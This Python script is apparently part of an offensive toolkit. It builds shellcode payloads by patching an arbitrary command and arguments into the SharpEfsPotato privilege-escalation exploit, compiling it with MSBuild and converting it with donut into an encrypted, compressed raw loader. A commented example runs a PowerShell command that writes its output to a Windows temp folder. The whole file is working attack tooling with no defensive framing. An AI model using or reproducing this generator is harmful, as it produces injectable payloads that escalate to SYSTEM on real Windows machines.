import os
import time

def gen_shellcode(cmd, args):
    potato_path = "C:\\Users\\teebow1e\\Desktop\\Toolkit\\SharpEfsPotato"
    with open(
        os.path.join(potato_path, "SharpEfsPotato\\Program.cs"), "r"
    ) as main_code_read:
        code_arr = main_code_read.readlines()

    code_arr[82] = f"""            string program = @"{cmd}";\n"""
    code_arr[83] = f"""            string programArgs = @"{args}";\n"""

    with open(
        os.path.join(potato_path, "SharpEfsPotato\\Program.cs"), "w"
    ) as main_code_write:
        main_code_write.writelines(code_arr)

    cmd = f"MSBuild.exe {potato_path}\\SharpEfsPotato.sln".replace(
        "\\\\", "\\"
    )
    
    os.system(cmd)
    
    exe_compiled_path = os.path.join(
        potato_path, "SharpEfsPotato\\bin\\Debug\\SharpEfsPotato.exe"
    )
    generate_time = str(int(time.time()))
    loader_path = f"C:\\Users\\teebow1e\\Desktop\\Toolkit\\SaaS\\outfile\\{generate_time}_pload.raw"
    if not os.path.exists(exe_compiled_path):
        return "[!] Compilation failed."

    os.system(f"donut.exe -i {exe_compiled_path} -e 3 -f 1 -z 2 -o {loader_path}")
    return loader_path


# print(gen_shellcode("C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe", "-c whoami | Set-Content C:\Windows\Temp\\a.log"))